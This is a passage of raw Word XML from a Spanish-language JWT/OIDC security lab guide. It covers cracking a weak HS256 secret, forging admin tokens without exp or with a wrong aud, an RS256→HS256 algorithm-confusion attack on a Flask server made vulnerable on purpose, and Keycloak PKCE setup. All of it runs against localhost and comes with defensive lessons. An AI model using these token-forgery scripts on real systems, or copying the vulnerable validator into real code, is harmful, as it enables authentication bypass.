        <w:t xml:space="preserve">        jwt.decode(tok, w, algorithms=["HS256"], options={"verify_aud": False})</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        print("CLAVE ENCONTRADA:", w); sys.exit(0)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    except Exception:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        pass</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>print("sin suerte (probá una wordlist real)")</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>PY</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>python crack.py</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Esperado: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1F3B66"/>
        </w:rPr>
        <w:t>CLAVE ENCONTRADA: secreto</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>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con HS256, un secreto débil equivale a no tener firma. Con una wordlist real (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>rockyou.txt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">) y </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>jwt_tool tok -C -d rockyou.txt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> el ataque es igual de directo.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Paso 10 — Token sin </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>exp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> y con </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>aud</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> equivocada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python - &lt;&lt;'PY'</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>import jwt</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>## sin exp, audience distinta</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>t = jwt.encode({"sub":"777","scope":"admin","aud":"otra-app","iss":"https://mi-lab"},</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">               "secreto", algorithm="HS256")</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>open("noexp.txt","w").write(t)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>print(t)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>PY</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>T=$(cat noexp.txt)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>echo "--- /vuln/debil (acepta) ---"; curl -s -H "Authorization: Bearer $T" http://127.0.0.1:5000/vuln/debil | jq</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>echo "--- /safe (debe rechazar por aud) ---"; curl -s -H "Authorization: Bearer $T" http://127.0.0.1:5000/safe | jq</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Esperado: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1F3B66"/>
        </w:rPr>
        <w:t>/vuln/debil</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> acepta; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>/safe</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> rechaza por </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>audience</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>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los claims </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>exp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color w:val="1F3B66"/>
        </w:rPr>
        <w:t>aud</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>hay que exigirlos</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>, no basta con que un token los traiga.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Paso 11 — (Avanzado) Confusión RS256 → HS256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openssl genrsa -out priv.pem 2048</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>openssl rsa -in priv.pem -pubout -out pub.pem</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>cat &gt; lab_rs.py &lt;&lt;'PY'</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>## Servidor RS256 VULNERABLE A PROPÓSITO: acepta HS256 usando la clave pública como secreto.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>from flask import Flask, request, jsonify</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>import jwt</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>app = Flask(__name__)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>PUB = open("pub.pem").read()</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>@app.route("/r")</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>def r():</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    tok = request.headers.get("Authorization","").replace("Bearer ","").strip()</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    return jsonify(ok=True, claims=jwt.decode(tok, PUB, algorithms=["HS256","RS256"]))</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>if __name__ == "__main__":</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    app.run(host="127.0.0.1", port=5001)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>PY</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>python lab_rs.py &amp;</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>sleep 2</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>python - &lt;&lt;'PY'</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>from pathlib import Path</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>import jwt</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>pub = Path("pub.pem").read_text()</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>forged = jwt.encode({"sub":"1","scope":"admin"}, pub, algorithm="HS256")</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>open("rs_attack.txt","w").write(forged)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>PY</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>curl -s -H "Authorization: Bearer $(cat rs_attack.txt)" http://127.0.0.1:5001/r | jq</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Esperado:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> el servidor acepta un token firmado con la </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>clave pública</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> como secreto HMAC.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permitir </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>algorithms=["HS256","RS256"]</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> abre la confusión de algoritmos. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Regla: el algoritmo se fija en el validador, no en el token.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (RFC 8725.)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Parte C — OIDC, PKCE y refresh con Keycloak</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Paso 12 — Levantar Keycloak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docker run -d --name keycloak -p 8080:8080 \</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  -e KEYCLOAK_ADMIN=admin -e KEYCLOAK_ADMIN_PASSWORD=admin \</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  quay.io/keycloak/keycloak:latest start-dev</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Abrí http://localhost:8080 → Administration Console → </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>admin</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> / </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>admin</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Paso 13 — Crear realm, cliente y usuario</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Realm:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> menú superior izquierdo → </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>Create realm</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> → nombre </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>lab</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> → </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>Create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Cliente:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>Clients</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> → </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>Create client</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> → Client ID </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>lab-web</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> → </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>Next</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> → </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Client authentication: OFF</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (cliente público) → </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>Next</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> → </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Valid redirect URIs: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1F3B66"/>
        </w:rPr>
        <w:t>http://localhost:8989/callback</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> → </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>Save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 xml:space="preserve">En la pestaña </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Advanced</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> del cliente: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Proof Key for Code Exchange (PKCE): S256</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (requerido). Guardá.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Para ver rotación de refresh: en </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Settings</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> activá </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Revoke Refresh Token</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (y </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>Refresh Token Max Reuse = 0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Usuario:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>Users</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> → </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>Add user</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> → username </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>tester</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> → </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>Create</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> → pestaña </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Credentials</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> → </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>Set password</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (sin temporal).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Qué configura:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> un IdP OIDC real en tu máquina, con PKCE y rotación de refresh.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Paso 14 — Ejecutar el flujo Authorization Code + PKCE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## Generar verifier y challenge (PKCE)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>VERIFIER=$(python -c "import secrets; print(secrets.token_urlsafe(64))")</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
